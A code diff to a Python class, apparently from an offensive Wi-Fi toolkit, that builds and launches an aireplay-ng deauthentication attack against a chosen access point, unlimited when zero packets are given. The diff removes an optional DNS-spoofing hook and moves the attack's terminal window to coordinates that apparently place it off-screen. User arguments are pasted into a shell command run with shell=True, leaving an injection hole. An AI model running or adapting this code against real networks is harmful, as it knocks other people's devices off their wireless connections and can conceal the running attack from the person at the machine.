@@ -10,11 +10,6 @@ class Deauth_Router:
 
       def __init__(self):
           self.args_Control()
-          if self.args.dns:
-             from Snake_Package.dns_spoofing import DNS_Spoofing
-             run = DNS_Spoofing()
-          else:
-              pass  
           self.death_wifi()
       def death_wifi(self):    
           Snake_interface  = [
@@ -34,7 +29,7 @@ class Deauth_Router:
                  command = "sudo aireplay-ng --deauth 0  -a "+f'{self.args.Deauth} '+" wlansnake"
               else:
                   command = "sudo aireplay-ng --deauth " +f'{self.args.Packet}' +" -a "+f'{self.args.Deauth} '+" wlansnake"
-          command_proc = ' gnome-terminal --geometry 110x30+40+40  -e ' +'"' +  command   +" --ignore-negative-one"+'"'                  
+          command_proc = ' gnome-terminal --geometry 110x20+5000+1000  -e ' +'"' +  command   +" --ignore-negative-one"+'"'                  
           call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)                            
       def args_Control(self):
             parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")
